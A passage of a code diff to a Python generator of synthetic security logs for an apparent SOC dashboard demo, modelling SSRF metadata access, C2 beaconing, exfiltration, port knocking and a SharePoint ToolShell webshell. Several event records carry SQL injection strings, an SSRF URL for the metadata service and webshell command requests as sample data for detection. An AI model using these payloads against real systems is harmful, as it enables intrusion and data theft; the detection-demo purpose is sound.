+    # Instance metadata and service gateway traffic from the compromised host.
+    events.append(vcn_flow_event(
+        WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+        "169.254.169.254",
+        43312,
+        80,
+        bytes_out=2048,
+        bytes_in=4096,
+        packets_out=6,
+        packets_in=8,
+        flow_id="flow-w2c-metadata-001",
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        stage="credential_access",
+        offset=127,
+    ))
+    events.append(vcn_flow_event(
+        WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+        "134.70.120.10",
+        43610,
+        443,
+        bytes_out=62914560,
+        bytes_in=16384,
+        packets_out=4200,
+        packets_in=640,
+        flow_id="flow-w2c-objectstorage-001",
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        stage="cloud_data_access",
+        offset=128,
+    ))
+
+    # Repeated outbound C2/exfil path to make frequency and byte-volume widgets visible.
+    for i, bytes_out in enumerate([2048, 4096, 8192, 73400320]):
+        events.append(vcn_flow_event(
+            WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+            WEB_TO_CLOUD_C2_IP,
+            44000 + i,
+            443,
+            bytes_out=bytes_out,
+            bytes_in=2048,
+            packets_out=18 + i * 20,
+            packets_in=10,
+            flow_id=f"flow-w2c-c2-{i + 1:03d}",
+            trace_id=WEB_TO_CLOUD_TRACE_ID,
+            stage="exfiltration" if bytes_out > 50000000 else "c2_beacon",
+            offset=129 + i,
+        ))
+
+    # ClickFix/CrashFix compromise: payload callbacks followed by staged exfil.
+    clickfix_flow_specs = [
+        (CLICKFIX_COMPROMISED_PRIVATE_IP, CLICKFIX_C2_IP, 46000, 443, 16384, 4096, "command_and_control"),
+        (CLICKFIX_COMPROMISED_PRIVATE_IP, "203.0.113.202", 46010, 443, 31457280, 2048, "exfiltration"),
+    ]
+    for i, (src_ip, dst_ip, src_port, dst_port, bytes_out, bytes_in, stage) in enumerate(clickfix_flow_specs):
+        events.append(vcn_flow_event(
+            src_ip,
+            dst_ip,
+            src_port,
+            dst_port,
+            bytes_out=bytes_out,
+            bytes_in=bytes_in,
+            packets_out=32 if stage == "command_and_control" else 2800,
+            packets_in=20,
+            flow_id=f"flow-clickfix-2026-{i + 1:03d}",
+            trace_id=CLICKFIX_TRACE_ID,
+            stage=stage,
+            offset=138 + i,
+        ))
+
+    # FreeLabFriday port-knocking lab sequence: valid 7000 -> 8000 -> 9000
+    # knock followed by SSH, plus a failing attacker with the wrong order.
+    for i, port in enumerate([7000, 8000, 9000, 22]):
+        events.append(vcn_flow_event(
+            "10.42.0.7",
+            "192.0.2.55",
+            54321 + i,
+            port,
+            action="ACCEPT",
+            bytes_out=60 if port != 22 else 4200,
+            bytes_in=40 if port != 22 else 5200,
+            packets_out=1 if port != 22 else 18,
+            packets_in=1 if port != 22 else 16,
+            flow_id=f"flow-flf-port-knock-valid-{i + 1:02d}",
+            trace_id="trace_flf_port_knock_001",
+            stage="port_knock" if port != 22 else "ssh_opened",
+            offset=145 + i,
+        ))
+    for i, port in enumerate([7000, 9000, 8000, 22]):
+        events.append(vcn_flow_event(
+            "198.51.100.12",
+            "192.0.2.55",
+            55321 + i,
+            port,
+            action="REJECT",
+            bytes_out=0,
+            bytes_in=0,
+            packets_out=1,
+            packets_in=0,
+            flow_id=f"flow-flf-port-knock-failed-{i + 1:02d}",
+            trace_id="trace_flf_port_knock_failed_001",
+            stage="port_knock_failed",
+            offset=151 + i,
+        ))
+
+    # Baseline accepted and rejected flows for contrast on the dashboard.
+    for i in range(8):
+        events.append(vcn_flow_event(
+            random.choice(CORPORATE_IPS),
+            random.choice(["10.0.1.20", "10.0.2.30", "10.0.3.40"]),
+            random.randint(49152, 65535),
+            random.choice([80, 443, 1521, 5432]),
+            bytes_out=random.randint(1200, 24000),
+            bytes_in=random.randint(900, 12000),
+            packets_out=random.randint(3, 30),
+            packets_in=random.randint(3, 25),
+            flow_id=f"flow-baseline-{i:03d}",
+            stage="baseline",
+            offset=170 + i,
+        ))
+    for i in range(4):
+        events.append(vcn_flow_event(
+            random.choice(SUSPICIOUS_IPS),
+            WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+            random.randint(49152, 65535),
+            random.choice([22, 3389, 8080, 9200]),
+            action="REJECT",
+            bytes_out=0,
+            bytes_in=0,
+            packets_out=1,
+            packets_in=0,
+            flow_id=f"flow-rejected-scan-{i:03d}",
+            stage="reconnaissance",
+            offset=185 + i,
+        ))
+
+    return events
+
+
+def network_firewall_event(log_type, src_ip, dst_ip, src_port, dst_port,
+                           protocol="tcp", action="allow", rule_name="allow-web-egress",
+                           app="ssl", bytes_sent=0, bytes_received=0,
+                           threat_name="", threat_category="", severity="",
+                           trace_id=None, stage=None, offset=0):
+    """Generate an OCI Network Firewall traffic/threat log-shaped record."""
+    event_time = ts(offset)
+    session_id = random.randint(1000000000, 9999999999)
+    data = {
+        "log_type": log_type,
+        "sessionid": str(session_id),
+        "src": src_ip,
+        "dst": dst_ip,
+        "sport": str(src_port),
+        "dport": str(dst_port),
+        "proto": protocol,
+        "action": action,
+        "rule": rule_name,
+        "app": app,
+        "bytes": str(int(bytes_sent) + int(bytes_received)),
+        "bytes_sent": str(bytes_sent),
+        "bytes_received": str(bytes_received),
+        "src_ip": src_ip,
+        "dst_ip": dst_ip,
+        "src_port": str(src_port),
+        "dst_port": str(dst_port),
+        "threatid": threat_name,
+        "threat_name": threat_name,
+        "category": threat_category,
+        "severity": severity,
+        "direction": "client-to-server",
+        "src_zone": "app-subnet",
+        "dst_zone": "internet",
+    }
+    return {
+        "datetime": iso_to_epoch_seconds(event_time) * 1000,
+        "logContent": {
+            "data": data,
+            "id": str(uuid.uuid4()),
+            "oracle": {
+                "compartmentid": COMPARTMENT_ID,
+                "ingestedtime": event_time,
+                "loggroupid": "ocid1.loggroup.oc1..socdemo",
+                "logid": "ocid1.log.oc1..networkfirewalldemo",
+                "tenantid": "ocid1.tenancy.oc1..example",
+            },
+            "source": "network-firewall",
+            "specversion": "1.0",
+            "time": event_time,
+            "type": "com.oraclecloud.networkfirewall.logs",
+        },
+        "Log Source": "SOC Network Firewall Logs",
+        "Trace ID": trace_id or "",
+        "Attack Stage": stage or "",
+        "Log Type": log_type,
+        "Action": action,
+        "Network Action": action,
+        "Source IP": src_ip,
+        "Destination IP": dst_ip,
+        "Source Port": str(src_port),
+        "Destination Port": str(dst_port),
+        "Protocol": protocol,
+        "Bytes Sent": str(bytes_sent),
+        "Bytes Received": str(bytes_received),
+        "Firewall Rule": rule_name,
+        "Threat Name": threat_name,
+        "Threat Category": threat_category,
+        "Severity Level": severity,
+        "Session ID": str(session_id),
+        "msg": f"Network Firewall {log_type} {action}: {src_ip}:{src_port} -> {dst_ip}:{dst_port}",
+    }
+
+
+def generate_network_firewall_events():
+    """Generate OCI Network Firewall logs for C2, exfiltration, and blocked scans."""
+    events = []
+
+    for i in range(3):
+        events.append(network_firewall_event(
+            "traffic",
+            WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+            WEB_TO_CLOUD_C2_IP,
+            45000 + i,
+            443,
+            action="allow",
+            rule_name="allow-app-egress-tls",
+            app="ssl",
+            bytes_sent=2048 + i * 1024,
+            bytes_received=1536,
+            trace_id=WEB_TO_CLOUD_TRACE_ID,
+            stage="c2_beacon",
+            offset=132 + i,
+        ))
+
+    events.append(network_firewall_event(
+        "threat",
+        WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+        WEB_TO_CLOUD_C2_IP,
+        45010,
+        443,
+        action="alert",
+        rule_name="inspect-app-egress",
+        app="ssl",
+        bytes_sent=73400320,
+        bytes_received=2048,
+        threat_name="Suspicious Data Exfiltration",
+        threat_category="data-theft",
+        severity="critical",
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        stage="exfiltration",
+        offset=136,
+    ))
+
+    events.append(network_firewall_event(
+        "threat",
+        WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+        "169.254.169.254",
+        45100,
+        80,
+        action="alert",
+        rule_name="detect-metadata-service-access",
+        app="web-browsing",
+        bytes_sent=2048,
+        bytes_received=4096,
+        threat_name="Cloud Metadata Service Access",
+        threat_category="credential-access",
+        severity="high",
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        stage="credential_access",
+        offset=137,
+    ))
+
+    events.append(network_firewall_event(
+        "traffic",
+        CLICKFIX_COMPROMISED_PRIVATE_IP,
+        CLICKFIX_C2_IP,
+        46100,
+        443,
+        action="allow",
+        rule_name="allow-workstation-egress-tls",
+        app="ssl",
+        bytes_sent=16384,
+        bytes_received=8192,
+        trace_id=CLICKFIX_TRACE_ID,
+        stage="command_and_control",
+        offset=138,
+    ))
+    events.append(network_firewall_event(
+        "threat",
+        CLICKFIX_COMPROMISED_PRIVATE_IP,
+        "203.0.113.202",
+        46110,
+        443,
+        action="alert",
+        rule_name="inspect-workstation-egress",
+        app="ssl",
+        bytes_sent=31457280,
+        bytes_received=2048,
+        threat_name="ClickFix Data Exfiltration",
+        threat_category="data-theft",
+        severity="critical",
+        trace_id=CLICKFIX_TRACE_ID,
+        stage="exfiltration",
+        offset=139,
+    ))
+
+    # FreeLabFriday port knocking evidence.
+    for i, port in enumerate([7000, 8000, 9000, 22]):
+        events.append(network_firewall_event(
+            "traffic",
+            "10.42.0.7",
+            "192.0.2.55",
+            54321 + i,
+            port,
+            action="allow",
+            rule_name="flf-port-knock-stateful-open" if port == 22 else "flf-port-knock-observed",
+            app="ssh" if port == 22 else "unknown-tcp",
+            bytes_sent=64 if port != 22 else 4200,
+            bytes_received=40 if port != 22 else 5200,
+            trace_id="trace_flf_port_knock_001",
+            stage="port_knock" if port != 22 else "ssh_opened",
+            offset=145 + i,
+        ))
+    for i, port in enumerate([7000, 9000, 8000, 22]):
+        events.append(network_firewall_event(
+            "traffic",
+            "198.51.100.12",
+            "192.0.2.55",
+            55321 + i,
+            port,
+            action="deny",
+            rule_name="flf-port-knock-wrong-sequence",
+            app="unknown-tcp",
+            bytes_sent=0,
+            bytes_received=0,
+            trace_id="trace_flf_port_knock_failed_001",
+            stage="port_knock_failed",
+            offset=151 + i,
+        ))
+
+    for i in range(6):
+        events.append(network_firewall_event(
+            "traffic",
+            random.choice(CORPORATE_IPS),
+            random.choice(["140.82.112.14", "142.250.80.46", "13.107.42.14"]),
+            random.randint(49152, 65535),
+            443,
+            action="allow",
+            rule_name="allow-enterprise-egress",
+            app="ssl",
+            bytes_sent=random.randint(1200, 24000),
+            bytes_received=random.randint(1200, 48000),
+            stage="baseline",
+            offset=190 + i,
+        ))
+    for i in range(4):
+        events.append(network_firewall_event(
+            "traffic",
+            random.choice(SUSPICIOUS_IPS),
+            WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+            random.randint(49152, 65535),
+            random.choice([22, 3389, 9200, 8080]),
+            action="deny",
+            rule_name="deny-internet-admin-ports",
+            app="unknown-tcp",
+            bytes_sent=0,
+            bytes_received=0,
+            stage="reconnaissance",
+            offset=205 + i,
+        ))
 
     return events
 
@@ -3934,7 +5018,8 @@ def waf_event(action, http_method, url, rule_type="PROTECTION_RULES", rule_key="
 
 
 def lb_access_event(http_method, url, status_code, client_ip=None, user_agent=None,
-                    bytes_sent="256", offset=0):
+                    bytes_sent="256", backend_address="10.0.1.50:9010",
+                    trace_id=None, offset=0):
     """Generate a Load Balancer access log event."""
     if client_ip is None:
         client_ip = random.choice(ATTACKER_IPS)
@@ -3950,7 +5035,7 @@ def lb_access_event(http_method, url, status_code, client_ip=None, user_agent=No
         "userAgent": user_agent,
         "statusCode": str(status_code),
         "backendStatusCode": str(status_code),
-        "backendAddress": "10.0.1.50:9010",
+        "backendAddress": backend_address,
         "bytesReceived": str(random.randint(100, 5000)),
         "bytesSent": bytes_sent,
         "requestProcessingTime": str(random.randint(1, 500)),
@@ -3959,13 +5044,14 @@ def lb_access_event(http_method, url, status_code, client_ip=None, user_agent=No
         "listenerName": "http-listener",
         "contentType": "application/json",
         "referer": f"https://{WAF_HOST}/",
+        "traceId": trace_id or f"trace_{uuid.uuid4().hex[:16]}",
         "msg": f"{http_method} {url} {status_code}",
     }
 
 
 def webapp_event(attack_type, owasp_category, url, http_method="GET",
                  status_code="200", payload="", client_ip=None,
-                 user_agent=None, offset=0):
+                 user_agent=None, trace_id=None, hostname=None, offset=0):
     """Generate a web application security event."""
     if client_ip is None:
         client_ip = random.choice(ATTACKER_IPS)
@@ -3987,12 +5073,73 @@ def webapp_event(attack_type, owasp_category, url, http_method="GET",
         "sessionId": f"sess_{uuid.uuid4().hex[:12]}",
         "appName": "seven-kingdoms-portal",
         "requestId": f"req_{uuid.uuid4().hex[:8]}",
-        "hostname": WAF_HOST,
+        "traceId": trace_id or f"trace_{uuid.uuid4().hex[:16]}",
+        "hostname": hostname or WAF_HOST,
         "requestBody": payload,
         "contentType": "application/json",
         "user": random.choice(["anonymous", "joffrey", "cersei", "tyrion"]),
         "msg": f"{attack_type}: {http_method} {url[:80]}",
     }
+
+
+def _service_namespace_for(service_name):
+    octo_services = {
+        "enterprise-crm-portal",
+        "octo-apm-demo",
+        "octo-drone-shop",
+        "octo-java-app-server",
+        "octo-workflow-gateway",
+    }
+    return "octo" if service_name in octo_services else "security-lab"
+
+
+def _service_version_for(service_name):
+    versions = {
+        "enterprise-crm-portal": "1.1.0",
+        "octo-drone-shop": "1.2.0",
+        "octo-apm-demo": "1.0.0",
+        "octo-java-app-server": "1.0.0",
+    }
+    return versions.get(service_name, "1.0.0")
+
+
+def _app_brand_for(service_name):
+    brands = {
+        "enterprise-crm-portal": "OCTO CRM APM",
+        "octo-drone-shop": "OCTO Drone Shop",
+        "octo-apm-demo": "OCTO APM Demo",
+        "octo-java-app-server": "OCTO Java APM Demo",
+    }
+    return brands.get(service_name, service_name)
+
+
+def _workflow_for_path(path):
+    normalized = path.split("?", 1)[0]
+    if normalized.startswith("/octo/internal/inventory"):
+        return "checkout", "inventory"
+    if normalized.startswith("/octo/internal/payment"):
+        return "checkout", "payment"
+    if normalized.startswith("/octo/internal/audit"):
+        return "checkout", "audit"
+    if normalized.startswith("/octo/checkout") or normalized.startswith("/shop/checkout"):
+        return "checkout", "entry"
+    if normalized.startswith("/octo/internal/auth"):
+        return "auth", "credentials"
+    if normalized.startswith("/octo/login"):
+        return "auth", "login"
+    if normalized.startswith("/octo/metrics"):
+        return "observability", "metrics"
+    if "/orders/sync" in normalized:
+        return "order-sync", "sync"
+    if "/orders" in normalized:
+        return "checkout", "order"
+    if "/payments" in normalized or "/payment" in normalized:
+        return "checkout", "payment"
+    if "/login" in normalized:
+        return "auth", "login"
+    if "/health" in normalized:
+        return "health", "readiness"
+    return "other", "unmapped"
 
 
 def application_event(service_name, message="Request completed", level="INFO",
@@ -4005,7 +5152,18 @@ def application_event(service_name, message="Request completed", level="INFO",
                       orders_sync_updated=0, orders_sync_failed=0,
                       orders_sync_source=None, referrer="https://app.example.com/",
                       response_headers="Content-Type: application/json; X-Frame-Options: DENY",
-                      content_type="application/json", hostname=None, offset=0):
+                      content_type="application/json", hostname=None, span_id=None,
+                      parent_span_id="", span_kind="SERVER", apm_domain=None,
+                      metric_name=None, metric_value=None, metric_unit=None,
+                      workflow_id=None, workflow_step=None, request_id=None,
+                      service_namespace=None, service_version=None,
+                      deployment_environment="production", app_name=None,
+                      app_brand=None, app_runtime="python", app_service=None,
+                      db_statement=None, db_elapsed_ms=None,
+                      db_connection_name=None, db_ocid=None, run_id=None,
+                      java_apm_path=None, java_apm_status_code=None,
+                      java_apm_latency_ms=None, java_apm_error_type=None,
+                      offset=0):
     """Generate application/browser telemetry shaped for the SOC app dashboards."""
     if client_ip is None:
         client_ip = random.choice(CORPORATE_IPS)
@@ -4025,38 +5183,112 @@ def application_event(service_name, message="Request completed", level="INFO",
         span_name = f"HTTP {http_method} {url.split('?', 1)[0]}"
     if hostname is None:
         hostname = "crm-portal-01" if service_name == "enterprise-crm-portal" else "drone-shop-01"
+    if span_id is None:
+        span_id = f"span_{uuid.uuid4().hex[:16]}"
+    if apm_domain is None:
+        apm_domain = service_name
+    if request_id is None:
+        request_id = f"req_{uuid.uuid4().hex[:8]}"
+    if service_namespace is None:
+        service_namespace = _service_namespace_for(service_name)
+    if service_version is None:
+        service_version = _service_version_for(service_name)
+    if app_name is None:
+        app_name = service_name
+    if app_brand is None:
+        app_brand = _app_brand_for(service_name)
+    if app_service is None:
+        app_service = service_name
+    if workflow_id is None or workflow_step is None:
+        inferred_workflow_id, inferred_workflow_step = _workflow_for_path(url)
+        workflow_id = workflow_id or inferred_workflow_id
+        workflow_step = workflow_step or inferred_workflow_step
+    if db_connection_name is None and db_target:
+        db_connection_name = "octo_atp_tp"
+    if db_elapsed_ms is None and db_target:
+        db_elapsed_ms = response_time_ms
+    uri_path = url.split("?", 1)[0]
 
     return {
         "timestamp": ts(offset),
         "serviceName": service_name,
+        "service.name": service_name,
+        "service.namespace": service_namespace,
+        "service.version": service_version,
+        "service.instance.id": hostname,
+        "deployment.environment": deployment_environment,
+        "app.name": app_name,
+        "app.brand": app_brand,
+        "app.runtime": app_runtime,
+        "app.service": app_service,
         "traceId": trace_id,
+        "trace_id": trace_id,
+        "span_id": span_id,
+        "oracleApmTraceId": trace_id,
+        "oracleApmSpanId": span_id,
+        "traceparent": f"00-{trace_id}-{span_id}-01",
         "httpMethod": http_method,
+        "http.method": http_method,
+        "http.request.method": http_method,
         "requestUrl": url,
-        "uriPath": url.split("?", 1)[0],
+        "uriPath": uri_path,
+        "http.url.path": uri_path,
         "queryString": url.split("?", 1)[1] if "?" in url else "",
         "statusCode": str(status_code),
+        "http.status_code": int(status_code),
+        "http.response.status_code": int(status_code),
+        "http_status": int(status_code),
         "responseTimeMs": response_time_ms,
+        "http.response_time_ms": response_time_ms,
+        "duration_ms": response_time_ms,
         "clientAddress": client_ip,
+        "http.client_ip": client_ip,
+        "client.address": client_ip,
         "userAgent": user_agent,
+        "user_agent.original": user_agent,
         "user": user,
         "sessionId": session_id,
-        "requestId": f"req_{uuid.uuid4().hex[:8]}",
+        "requestId": request_id,
+        "request_id": request_id,
+        "workflow_id": workflow_id,
+        "workflow_step": workflow_step,
+        "correlation.id": trace_id,
+        "run_id": run_id,
+        "route": uri_path,
         "contentType": content_type,
         "referrer": referrer,
         "responseHeaders": response_headers,
         "spanName": span_name,
         "spanAttributes": span_attributes,
+        "spanId": span_id,
+        "parentSpanId": parent_span_id,
+        "spanKind": span_kind,
+        "apmDomain": apm_domain,
+        "metricName": metric_name,
+        "metricValue": metric_value,
+        "metricUnit": metric_unit,
         "securityAttackType": attack_type,
         "securityAttackSeverity": attack_severity,
         "wafScore": waf_score,
         "dbTarget": db_target,
+        "db.target": db_target,
+        "db.statement": db_statement,
+        "db.elapsed_ms": db_elapsed_ms,
+        "db.connection_name": db_connection_name,
+        "db.ocid": db_ocid,
         "errorType": error_type,
         "slowRequest": "true" if slow_request else "false",
+        "performance.slow_request": bool(slow_request),
+        "java_apm.path": java_apm_path,
+        "java_apm.status_code": java_apm_status_code,
+        "java_apm.latency_ms": java_apm_latency_ms,
+        "java_apm.error_type": java_apm_error_type,
         "ordersSyncCreated": orders_sync_created,
         "ordersSyncUpdated": orders_sync_updated,
         "ordersSyncFailed": orders_sync_failed,
         "ordersSyncSource": orders_sync_source,
         "level": level,
+        "severity": level,
         "hostname": hostname,
         "message": message,
     }
@@ -4077,10 +5309,28 @@ def generate_waf_events():
         "/vulnerable/search?q=' UNION SELECT NULL,table_name FROM INFORMATION_SCHEMA.TABLES--",
     ]
     for i, payload in enumerate(sqli_payloads):
-        events.append(waf_event("BLOCK", "GET", payload, rule_key="941100", offset=i))
+        events.append(waf_event("BLOCK", "GET", payload, rule_key="942100", offset=i))
     # SQLi allowed through (detection mode)
     events.append(waf_event("DETECT", "GET", "/vulnerable/search?q=1' OR '1'='1",
-                            rule_key="941100", response_code="200", offset=8))
+                            rule_key="942100", response_code="200", offset=8))
+
+    # Fresh 24-hour SQLi showcase events for live threat-hunting demos.
+    # They sit ~2 hours before "now" so the l24h dashboard widget remains
+    # populated even after a long workshop setup window.
+    recent_sqli_payloads = [
+        "/crm/search?q=1' OR 1=1--",
+        "/shop/api/orders?sort=UNION%20SELECT%20username,password%20FROM%20users",
+        "/crm/reports?id=1' AND SLEEP(5)--",
+    ]
+    for i, payload in enumerate(recent_sqli_payloads):
+        events.append(waf_event(
+            "BLOCK", "GET", payload,
+            rule_key="942100",
+            client_ip=WEB_TO_CLOUD_ATTACKER_IP,
+            user_agent="sqlmap/1.7",
+            trace_id=f"trace_waf_sqli_24h_{i:02d}",
+            offset=1320 + (i * 2),
+        ))
 
     # XSS attacks (blocked)
     xss_payloads = [
@@ -4233,6 +5483,41 @@ def generate_waf_events():
                                 trace_id=trace_id,
                                 offset=off))
 
+    events.append(waf_event(
+        "DETECT", "GET", WEB_TO_CLOUD_REQUEST_URL,
+        rule_key="934100",
+        client_ip=WEB_TO_CLOUD_ATTACKER_IP,
+        user_agent=WEB_TO_CLOUD_ATTACKER_UA,
+        response_code="200",
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        offset=120,
+    ))
+
+    events.extend([
+        waf_event(
+            "DETECT", "POST",
+            "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
+            rule_key="933130",
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            response_code="200",
+            body_data="__VIEWSTATE=/wEPDwUKMTY...; webshell=spinstall0.aspx",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            offset=122,
+        ),
+        waf_event(
+            "BLOCK", "POST",
+            "/_layouts/15/spinstall0.aspx?cmd=whoami",
+            rule_key="932100",
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            response_code="403",
+            body_data="cmd=whoami",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            offset=123,
+        ),
+    ])
+
     return events
 
 
@@ -4306,6 +5591,19 @@ def generate_lb_access_events():
     events.append(lb_access_event("GET", "/vulnerable/", 200,
                                   user_agent="zgrab/0.x", offset=88))
 
+    for idx, method in enumerate(["GET", "GET", "GET", "POST"]):
+        events.append(lb_access_event(
+            method,
+            "/beacon",
+            200,
+            client_ip="10.0.0.5",
+            user_agent="vsagent/1.0",
+            bytes_sent="128" if method == "GET" else "2048",
+            backend_address="192.168.56.1:80",
+            trace_id="trace_flf_vsagent_001",
+            offset=91 + idx,
+        ))
+
     # Normal traffic (for baseline)
     normal_uas = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -4317,6 +5615,41 @@ def generate_lb_access_events():
                                       client_ip=random.choice(CORPORATE_IPS),
                                       user_agent=random.choice(normal_uas),
                                       offset=100 + i))
+
+    events.append(lb_access_event(
+        "GET", WEB_TO_CLOUD_REQUEST_URL, 200,
+        client_ip=WEB_TO_CLOUD_ATTACKER_IP,
+        user_agent=WEB_TO_CLOUD_ATTACKER_UA,
+        bytes_sent="8192",
+        backend_address=f"{WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP}:9010",
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        offset=125,
+    ))
+
+    events.extend([
+        lb_access_event(
+            "POST",
+            "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
+            200,
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            bytes_sent="12288",
+            backend_address=f"{TOOL_SHELL_BACKEND}:443",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            offset=127,
+        ),
+        lb_access_event(
+            "POST",
+            "/_layouts/15/spinstall0.aspx?cmd=whoami",
+            500,
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            bytes_sent="4096",
+            backend_address=f"{TOOL_SHELL_BACKEND}:443",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            offset=128,
+        ),
+    ])
 
     return events
 
@@ -4378,6 +5711,46 @@ def generate_webapp_events():
         "/vulnerable/api/users/register", "POST", "200",
         payload='{"username":"attacker","password":"pass123","isAdmin":true,"role":"admin","balance":999999}',
         client_ip=attacker_ip, offset=16))
+
+    events.append(webapp_event(
+        "ssrf_metadata_access", "A10:2021-Server-Side Request Forgery",
+        WEB_TO_CLOUD_REQUEST_URL, "GET", "200",
+        payload="url=http://169.254.169.254/opc/v2/instance/",
+        client_ip=WEB_TO_CLOUD_ATTACKER_IP,
+        user_agent=WEB_TO_CLOUD_ATTACKER_UA,
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        hostname=WEB_TO_CLOUD_COMPROMISED_HOST,
+        offset=24,
+    ))
+
+    events.extend([
+        webapp_event(
+            "SharePoint_ToolShell_Exploit",
+            "A03:2021-Injection",
+            "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
+            "POST",
+            "200",
+            payload="__VIEWSTATE=/wEPDwUKMTY...; webshell=spinstall0.aspx",
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            hostname=TOOL_SHELL_HOST,
+            offset=26,
+        ),
+        webapp_event(
+            "SharePoint_ToolShell_Webshell_Command",
+            "A03:2021-Injection",
+            "/_layouts/15/spinstall0.aspx?cmd=whoami",
+            "POST",
+            "500",
+            payload="cmd=whoami",
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            hostname=TOOL_SHELL_HOST,
+            offset=27,
+        ),
+    ])
 
     return events
 
@@ -4643,6 +6016,595 @@ def generate_application_events():
         offset=88,
     ))
 
+    for idx, method in enumerate(["GET", "GET", "GET", "POST"]):
+        events.append(application_event(
+            "vsagent-c2-emulator",
+            message="vsagent beacon check-in" if method == "GET" else "vsagent output post",
+            level="WARN",
+            url="/beacon",
+            http_method=method,
+            status_code="200",
+            response_time_ms=45 if method == "GET" else 180,
+            client_ip="10.0.0.5",
+            user_agent="vsagent/1.0",
+            user="CORP\\jsmith",
+            trace_id="trace_flf_vsagent_001",
+            session_id="sess_flf_vsagent_001",
+            span_name=f"HTTP {method} /beacon",
+            span_attributes="cmd=base64 output=base64 stripped-headers no-referrer",
+            attack_type="c2_http_beacon",
+            attack_severity="critical",
+            referrer=None,
+            hostname="flf-c2-controller",
+            offset=90 + idx,
+        ))
+
+    events.extend([
+        application_event(
+            "enterprise-crm-portal",
+            message="SSRF request reached instance metadata service",
+            level="WARN",
+            url=WEB_TO_CLOUD_REQUEST_URL,
+            http_method="GET",
+            status_code="200",
+            response_time_ms=1175,
+            client_ip=WEB_TO_CLOUD_ATTACKER_IP,
+            user_agent=WEB_TO_CLOUD_ATTACKER_UA,
+            user="svc-app",
+            trace_id=WEB_TO_CLOUD_TRACE_ID,
+            session_id="sess_w2c_entry_001",
+            span_name="HTTP GET /crm/profile/avatar",
+            span_attributes="metadata.oraclecloud.com 169.254.169.254 instance-principal token",
+            attack_type="ssrf_metadata_access",
+            attack_severity="critical",
+            waf_score="91",
+            db_target="oracle_atp",
+            hostname=WEB_TO_CLOUD_COMPROMISED_HOST,
+            offset=95,
+        ),
+        application_event(
+            "enterprise-crm-portal",
+            message=f"Exported customer data object {WEB_TO_CLOUD_EXFIL_OBJECT}",
+            level="WARN",
+            url=f"/crm/admin/export?object={WEB_TO_CLOUD_EXFIL_OBJECT}",
+            http_method="POST",
+            status_code="200",
+            response_time_ms=2860,
+            client_ip=WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+            user_agent="svc-app/1.4 object-storage-client",
+            user=WEB_TO_CLOUD_COMPROMISED_USER,
+            trace_id=WEB_TO_CLOUD_TRACE_ID,
+            session_id="sess_w2c_entry_001",
+            span_name="POST /crm/admin/export",
+            span_attributes=f"objectstorage getobject {WEB_TO_CLOUD_BUCKET}/{WEB_TO_CLOUD_EXFIL_OBJECT}",
+            attack_type="cloud_data_exfiltration",
+            attack_severity="critical",
+            db_target="oracle_atp",
+            hostname=WEB_TO_CLOUD_COMPROMISED_HOST,
+            slow_request=True,
+            offset=96,
+        ),
+    ])
+
+    events.extend([
+        application_event(
+            "sharepoint-intranet",
+            message="SharePoint ToolShell exploit request reached vulnerable endpoint",
+            level="WARN",
+            url="/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
+            http_method="POST",
+            status_code="200",
+            response_time_ms=1840,
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            user="NT AUTHORITY\\IUSR",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            session_id="sess_toolshell_sp_001",
+            span_name="POST /_layouts/15/ToolPane.aspx",
+            span_attributes="SharePoint ToolShell CVE-2025-53770-style exploit webshell spinstall0.aspx",
+            attack_type="ToolShell_initial_access",
+            attack_severity="critical",
+            waf_score="96",
+            hostname=TOOL_SHELL_HOST,
+            offset=98,
+        ),
+        application_event(
+            "sharepoint-intranet",
+            message="SharePoint webshell command execution attempted",
+            level="ERROR",
+            url="/_layouts/15/spinstall0.aspx?cmd=whoami",
+            http_method="POST",
+            status_code="500",
+            response_time_ms=2320,
+            client_ip=TOOL_SHELL_ATTACKER_IP,
+            user_agent="python-requests/2.31.0",
+            user="NT AUTHORITY\\IUSR",
+            trace_id=TOOL_SHELL_TRACE_ID,
+            session_id="sess_toolshell_sp_001",
+            span_name="POST /_layouts/15/spinstall0.aspx",
+            span_attributes="cmd=whoami IIS worker webshell post exploitation",
+            attack_type="ToolShell_webshell_execution",
+            attack_severity="critical",
